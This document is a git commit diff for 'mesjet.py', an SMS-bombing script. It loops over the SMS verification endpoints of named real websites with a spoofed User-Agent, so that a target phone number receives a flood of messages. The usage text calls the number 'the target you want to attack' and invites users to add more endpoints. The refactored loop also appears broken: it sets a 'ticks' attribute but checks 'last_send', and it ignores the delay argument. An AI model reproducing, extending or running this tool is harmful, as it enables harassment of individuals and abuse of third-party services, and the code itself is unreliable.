60f58416910defb1078342bbc02c39656b58081f
Blume <35988320+81Vm3@users.noreply.github.com>
2020-02-06 22:53:35 +0800

    simplized code, and more understandable

--- mesjet.py
+++ mesjet.py
@@ -5,7 +5,7 @@
 #Copyright (c) 2019 Blume
 #
 #Permission is hereby granted, free of charge, to any person obtaining a copy
-#of this software and associated documentation files (the "Software"), to deal
+#of this software and associated documentation files (the 'Software'), to deal
 #in the Software without restriction, including without limitation the rights
 #to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 #copies of the Software, and to permit persons to whom the Software is
@@ -14,7 +14,7 @@
 #The above copyright notice and this permission notice shall be included in all
 #copies or substantial portions of the Software.
 #
-#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+#THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 #IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 #FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 #AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
@@ -22,63 +22,67 @@
 #OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 #SOFTWARE.
 
-import sys, getopt, requests, time
+import sys, requests, time
 
 fake_headers = {
     "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
 }
 
-target = 0 #目标手机号
-total = 0 #已发送的短信数量
+def getTickCount():
+    return int(round(time.time() * 1000))
+
+def keyboardInterruptExit():
+    print("\nThe mission has been canceled.")
+    exit()
 
 class CExploit():
-    def __init__(self, name, url, delay, postorget, data):
-        self.name = str(name) #名字
-        self.url = str(url) #链接
-        self.delay = int(delay) #延迟
-        self.postorget = bool(postorget) #post(true)或者是get(false)
-        self.data = data #数据，可以是json也可以是参数
-        self.ticks = 0.0 #unix时间戳
+    def __init__(self, name, url, delay, post_or_get, data):
+        self.name = str(name) 
+        self.url = str(url) 
+        self.delay = int(delay) 
+        self.post_or_get = bool(post_or_get) #post is true whereas get is false
+        self.data = data #can be json or parameters
+        self.last_send = 0
 
     def setMobile(self, pmobile):
-        if self.postorget:
+        if self.post_or_get:
             for i in self.data:
-                if type(self.data[i]) == str: #是字符串
+                if type(self.data[i]) == str: #is string
                     if self.data[i] == "__MOBILE":
-                        self.data[i] = str(pmobile) #换成设置的手机号
+                        self.data[i] = str(pmobile)
         else:
             if type(self.data) == str:
-                self.data = self.data.replace("__MOBILE", str(pmobile)) #类似同上
+                self.data = self.data.replace("__MOBILE", str(pmobile)) #it"s for get
 
-    def attack(self):
-        try:  
-            if self.postorget:
+    def perform(self):
+        try:
+            if self.post_or_get:
                 r = requests.post(self.url, data=self.data, headers=fake_headers)
-                #print(r.text)
+                print(r.text)
                 #print(r.status_code)
             else:
                 #print(self.url + self.data)
                 r = requests.get(self.url + self.data, headers=fake_headers)
-                #print(r.text)
+                print(r.text)
                 #print(r.status_code)
-            global total
-            total += 1
+        except KeyboardInterrupt:
+            keyboardInterruptExit()
         except:
-            print("Failed to call \"%s\" api" % (self.name))
+            print("Failed to call \"%s\"" % (self.name))
 
 exploits = [
+    #------USEFUL------
     CExploit("OCQ云智能管理", "http://app.imocq.com/login/registerInMobilePhone", 60, True, {"emailMobilePhone":"__MOBILE"}),
-    CExploit("娄江论坛", "http://bbs.jrkunshan.cn/file/meisheng/ajaxsend.php", 60, True, {"mobile":"__MOBILE"}),
-    CExploit("大V店", "http://usercenter.chinadaily.com.cn/regist/getPhoneValidateCode", 60, True, {"phonenum":"__MOBILE"}),
-    CExploit("捷才教育", "http://user.yzjcpx.com/sms/yanzheng.html", 120, False, "?mobile=__MOBILE"),
     CExploit("四川省特种设备考试机构报名系统", "http://t.scasei.org.cn/ajax/send-mobile-code", 30, True, {"mobile":"__MOBILE", "usage":"register"}),
-    CExploit("大V店", "http://s.davdian.com/index.php?c=sms&a=send", 60, True, {"mobile":"__MOBILE"}),
-    CExploit("Dfv", "http://www.defuv.com/index.php/Ajax/send_msg", 60, False, "?mobile=__MOBILE"),
-    CExploit("私募排排网", "https://fof.simuwang.com/index.php?c=Login&a=getRegisterPhoneCode", 60, False, "&phone=__MOBILE"),
-    CExploit("迪卡侬", "https://www.decathlon.com.cn/zh/ajax/rest/model/atg/userprofiling/ProfileActor/send-mobile-verification-code", 30, True, {"countryCode":"CN","mobile":"__MOBILE"}),
-    CExploit("中华支教与助学信息中心(CTA)", "http://www.cta613.org/sendsms.php", 60, True, {"y":1, "sj":"__MOBILE"}),
-    CExploit("金融号", "http://jrh.financeun.com/Login/sendMessageCode3.html", 60, False, "?mobile=__MOBILE&mbid=197858")
+    #------USEFUL------
+    
+    #CExploit("大V店", "http://s.davdian.com/index.php?c=sms&a=send", 60, True, {"mobile":"__MOBILE"}),
+    #CExploit("Dfv", "http://www.defuv.com/index.php/Ajax/send_msg", 60, False, "?mobile=__MOBILE"),
+    #CExploit("迪卡侬", "https://www.decathlon.com.cn/zh/ajax/rest/model/atg/userprofiling/ProfileActor/send-mobile-verification-code", 30, True, {"countryCode":"CN","mobile":"__MOBILE"}),
+    #CExploit("潇x书院", "https://www.xxsy.net/Reg/Actions", 120, True, {"method":"sms", "mobile":"__MOBILE", "uname":"__MOBILE", "imgcode":"", "token":"0a33fad857c24e16640c4f2b18feaa97"}),
+
     #########由于某种未知原因无法使用
+    #CExploit("私募排排网", "https://fof.simuwang.com/index.php?c=Login&a=getRegisterPhoneCode", 60, False, "&phone=__MOBILE"),
     #CExploit("超级简历", "https://www.wondercv.com/verify_tokens/phone", 60, True, {"phone_number":"__MOBILE"}),
     #CExploit("和讯", "https://reg.hexun.com/ajax/login_ajax.aspx", 60, True, {"mobile":"__MOBILE", "verifycode":"", "act": "sendsms_login"}),
     #CExploit("华图在线", "http://api.huatu.com/lumenapi/v4/common/message/send_by_java", 60, False, "?mobile=__MOBILE"),
@@ -86,47 +90,30 @@ exploits = [
     #########
 ]
 
+if len(sys.argv) < 2:
+    print("""usage: [phone-number] [delay]
+        phone-number --- The target you want to attack.
+        delay        --- Millisecond, to slow the script down instead of done all performance at time.""")
+
+    print("The script currently has a total of %d exploits. (You can open & edit the script for adding more)" % (len(exploits)))
+
+    exit()
+
+target = sys.argv[1]
+delay  = sys.argv[2]
+
+for i in range(len(exploits)):
+    exploits[i].setMobile(int(target))
+
+last_send = 0
+
 try:
-    opts, args = getopt.getopt(sys.argv[1:], "hn:d:",
-    ["help","number=","delay="])
-
-except getopt.GetoptError as err:
-    print(str(err))  # will print something like "option -a not recognized"
-    sys.exit()
-
-if not opts:
-    sys.exit()
-
-last_send = 0.0
-delay = 0.0
-delay_set = False
-
-for opt_name,opt_value in opts:
-    if opt_name == '-n':
-        target = int(opt_value)
-
+    while(True):
         for i in range(len(exploits)):
-            exploits[i].setMobile(target)
+            if (getTickCount() - last_send) > 1000:
+                if (getTickCount() - exploits[i].last_send) > exploits[i].delay:
+                    exploits[i].perform()
+                    last_send = exploits[i].ticks = getTickCount()
 
-    if opt_name == '-d':
-        delay = float(opt_value)
-        delay_set = True
-
-if not delay_set:
-    delay = 3 #默认是三秒
-
-if target > 0:
-    try:
-        while(True):
-            for i in range(len(exploits)):
-                if time.time() - exploits[i].ticks >= exploits[i].delay: #服务端上的限制时间
-                    #print("%d %f, %f, %f" % (i, time.time(), last_send, delay))
-                    if time.time() - last_send >= delay: #用户自己设置的延迟 (如果是0，就像是霰弹枪一下子全部打出去)
-                        exploits[i].attack()
-                        last_send = exploits[i].ticks = time.time()
-                        print("Sent \033[91m%d\033[0m messages" % (total));
-
-    except KeyboardInterrupt:
-        print("\nMission terminated")
-else:
-    print("Invalid mobile number")
+except KeyboardInterrupt:
+    keyboardInterruptExit()
